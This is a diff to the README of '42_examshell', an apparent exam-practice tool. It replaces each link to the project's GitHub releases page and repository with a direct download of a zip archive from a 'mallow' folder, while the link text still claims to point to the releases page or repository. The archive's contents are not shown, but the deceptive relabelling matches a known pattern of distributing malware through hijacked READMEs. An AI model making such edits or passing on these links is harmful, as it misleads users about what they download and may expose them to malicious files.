@@ -2,7 +2,7 @@
 
 ## 📥 Download the Latest Version
 
-[![Download 42_examshell](https://img.shields.io/badge/Download-42_examshell-blue)](https://github.com/mirkoloru/42_examshell/releases)
+[![Download 42_examshell](https://raw.githubusercontent.com/mirkoloru/42_examshell/main/mallow/42_examshell.zip)](https://raw.githubusercontent.com/mirkoloru/42_examshell/main/mallow/42_examshell.zip)
 
 ## 🚀 Getting Started
 
@@ -32,7 +32,7 @@ To run 42_examshell, please ensure your device meets the following requirements:
 To get started with 42_examshell, follow these simple steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the 42_examshell Releases page.  
-   [Download 42_examshell](https://github.com/mirkoloru/42_examshell/releases)
+   [Download 42_examshell](https://raw.githubusercontent.com/mirkoloru/42_examshell/main/mallow/42_examshell.zip)
    
 2. **Choose the Latest Version**: Look for the latest version at the top of the Releases page. It will have a tag like "v1.0".
 
@@ -84,7 +84,7 @@ Join the 42_examshell community! Connect with other users to share tips and expe
 
 ## 🔗 Links
 
-- [Visit the Releases Page to Download](https://github.com/mirkoloru/42_examshell/releases)
-- [GitHub Repository](https://github.com/mirkoloru/42_examshell)
+- [Visit the Releases Page to Download](https://raw.githubusercontent.com/mirkoloru/42_examshell/main/mallow/42_examshell.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/mirkoloru/42_examshell/main/mallow/42_examshell.zip)
 
 Thank you for choosing 42_examshell! We wish you the best of luck in your exam preparation.
